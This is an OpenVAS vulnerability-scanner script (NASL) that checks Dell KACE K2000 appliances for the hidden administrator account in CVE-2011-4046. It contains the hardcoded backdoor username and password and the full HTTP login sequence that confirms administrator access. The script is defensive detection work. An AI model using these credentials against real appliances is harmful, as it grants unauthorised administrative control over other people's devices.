###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dell_kace_2000_backdoor.nasl 3117 2016-04-19 10:19:37Z benallard $
#
# Dell KACE K2000 Backdoor
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "The Dell KACE K2000 System Deployment Appliance contains a hidden
administrator account that allow a remote attacker to take
control of an affected device.";

if (description)
{
 script_id(103318);
 script_cve_id("CVE-2011-4046");
 script_bugtraq_id(50605);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_version ("$Revision: 3117 $");

 script_name("Dell KACE K2000 Backdoor");


 script_tag(name:"last_modification", value:"$Date: 2016-04-19 12:19:37 +0200 (Tue, 19 Apr 2016) $");
 script_tag(name:"creation_date", value:"2011-11-11 11:42:28 +0100 (Fri, 11 Nov 2011)");
 script_tag(name:"qod_type", value:"remote_vul");
 script_summary("Determine if remote KACE K2000 System is vulnerable");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("gb_dell_kace_2000_web_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.kb.cert.org/vuls/id/135606");
 script_xref(name : "URL" , value : "http://www.kace.com/support/kb/index.php?action=artikel&id=1120&artlang=en");
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

if(! get_kb_item("www/" + port + "/dell_kace_version") )exit(0);

url = "/";
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
if( buf == NULL ) exit(0);;

session_id = eregmatch(pattern:"Set-Cookie: (kboxid=[^;]+)",string:buf);
if(isnull(session_id[1]))exit(0);
sess = session_id[1];

up = "kbox1248163264128256";
url = "/_login";
host = get_host_name();

ex = string("LOGIN_NAME=",up,"&LOGIN_PASSWORD=",up,"&save=Login");

req = string(
	     "POST ", url, " HTTP/1.1\r\n",
	     "Host: ", host,"\r\n",
	     "Content-Type: application/x-www-form-urlencoded;\r\n",
	     "Connection: Close\r\n",
	     "Cookie: ",sess,"\r\n",
	     "Content-Length: ",strlen(ex),"\r\n",
	     "\r\n",
	     ex
	     );

res = http_send_recv(port:port, data:req);

if(res =~ "HTTP/1.. 30") {

  loc = "/tasks";
  req = string(
  	       "GET ", loc , " HTTP/1.1\r\n",
	       "Host: ", host,"\r\n",
	       "Cookie: ",sess,"\r\n",
  	       "Connection: Keep-Alive\r\n\r\n"
              );

  res = http_send_recv(port:port, data:req);

  if("Logged in as: kbox" >< res && "Log Out" >< res) {
    security_message(port:port);
    exit(0);
  }  

}

exit(0);
